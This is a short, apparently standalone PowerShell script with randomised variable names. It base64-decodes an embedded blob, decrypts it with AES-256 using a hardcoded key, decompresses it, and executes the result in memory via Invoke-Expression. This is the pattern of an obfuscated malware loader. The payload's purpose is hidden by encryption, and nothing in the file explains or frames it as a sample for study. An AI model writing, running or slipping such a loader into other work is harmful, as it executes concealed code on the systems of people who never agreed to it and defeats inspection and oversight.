$txbbqn = [System.Convert]::FromBase64String("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")
$nteukuxy = New-Object "System.Security.Cryptography.AesManaged"
$hetyqkcxh = [System.Convert]::FromBase64String("PvYpR4jr3GsuCX43pcxJWYst/D3vQhMeEMCuKvJMJXA=")
$nteukuxy.Padding = [System.Security.Cryptography.PaddingMode]::ISO10126
$nteukuxy.Mode = [System.Security.Cryptography.CipherMode]::CBC
$nteukuxy.IV = $txbbqn[0..15]
$nteukuxy.KeySize = 256
$nteukuxy.Key = $hetyqkcxh
$nteukuxy.BlockSize = 128
$yerq = New-Object System.IO.MemoryStream
$oriy = New-Object System.IO.MemoryStream(,$nteukuxy.CreateDecryptor().TransformFinalBlock($txbbqn,16,$txbbqn.Length-16))
$abesxkwj = New-Object System.IO.Compression.GzipStream $oriy, ([IO.Compression.CompressionMode]::Decompress)
$abesxkwj.CopyTo($yerq)
$nteukuxy.Dispose()
$abesxkwj.Close()
$oriy.Close()
$nafac = [System.Text.Encoding]::UTF8.GetString($yerq.ToArray())
Invoke-Expression($nafac)
